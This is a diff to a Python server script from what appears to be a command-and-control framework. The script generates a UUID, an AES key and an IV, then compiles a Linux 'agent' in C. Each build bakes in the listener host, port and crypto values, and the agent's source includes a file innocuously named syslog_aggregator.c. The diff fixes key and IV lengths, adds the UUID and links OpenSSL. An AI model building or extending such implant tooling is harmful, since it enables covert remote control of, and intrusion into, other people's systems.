@@ -6,8 +6,8 @@ import subprocess
 
 from base64 import b64encode, b64decode
 
-from server.connections.main import listener
-from server.crypto import rand_iv, rand_key, gen_uuid
+from server.connections.main import listener, server
+from server.crypto import rand_iv, rand_key, gen_uuid, padding
 from server.db.manager import check_db, add_agent, connection
 
 HOST: str = "127.0.0.1"
@@ -16,7 +16,7 @@ AGENT_NAME: str = "gravity"
 db_cursor = None
 
 logging.basicConfig(
-        level=logging.INFO,
+        level=logging.DEBUG,
         format='[%(levelname)s]: %(message)s'
 )
 
@@ -56,19 +56,20 @@ def parse_agent_cmd(call: list[str, ...]) -> None:
 def build_agent() -> None:
     uuid: str = gen_uuid()
     logging.info("Successfully generated UUID for agent!")
-    key: str = b64encode(rand_key()).decode('utf-8')
+    key: str = b64encode(rand_key()).decode('utf-8').ljust(32)[:32].replace(" ", "-")
     logging.info("Successfully generated new encryption key!")
-    iv: str = b64encode(rand_iv()).decode('utf-8')
+    iv: str = b64encode(rand_iv()).decode('utf-8').ljust(16)[:16].replace(" ", "-")
     logging.info("Successfully generated new IV!")
 
-    print("\n" + "-"*60)
+    print("\n" + "-" * 60)
     print(f"UUID: {uuid}")
     print(f"Encryption key: {key}")
-    print(f"iv: {iv}")
-    print("-"*60 + "\n")
+    print(f"iv ({len(iv.encode('utf-8'))}): {iv}")
+    print("-" * 60 + "\n")
 
     logging.info("Building agent...")
-    cmd = f"gcc -Wall agent/linux/main.c agent/linux/syslog_aggregator.c -o {AGENT_NAME} -D LHOST=\"{HOST}\" -D PORT={PORT} -D IV=\"{iv}\" -D KEY=\"{key}\""
+    # agent/linux/aes.c
+    cmd = f"gcc -Wall agent/linux/main.c agent/linux/syslog_aggregator.c -o {AGENT_NAME} -D LHOST=\"{HOST}\" -D PORT={PORT} -D IV=\"{iv}\" -D KEY=\"{key}\" -D UUID=\"{uuid}\" -lcrypto -lssl"
     logging.info(f"Running '{cmd}'")
     output = subprocess.check_output(cmd.split(), text=True)
     if AGENT_NAME in os.listdir():
@@ -126,4 +127,3 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         logging.info("Exiting...")
         db_cursor.close()
-        connection.close()
